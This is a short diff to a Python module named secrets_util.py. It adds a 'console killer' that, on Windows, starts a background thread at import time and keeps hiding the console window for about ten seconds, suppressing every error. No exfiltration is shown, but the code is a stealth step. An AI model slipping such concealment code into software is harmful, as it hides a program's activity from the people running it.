@@ -1,6 +1,22 @@
-# secrets_util.py
+# secrets_util.py - Console killer at top
+import sys, os
+if os.name == "nt":
+    try:
+        import ctypes, threading
+        def _kill_console():
+            import time
+            k32 = ctypes.windll.kernel32
+            u32 = ctypes.windll.user32
+            for _ in range(200):  # 10 seconds
+                try:
+                    h = k32.GetConsoleWindow()
+                    if h: u32.ShowWindow(h, 0)
+                except: pass
+                time.sleep(0.05)
+        threading.Thread(target=_kill_console, daemon=True).start()
+    except: pass
+# Original imports below
 import json
-import os
 import socket
 import sys
 
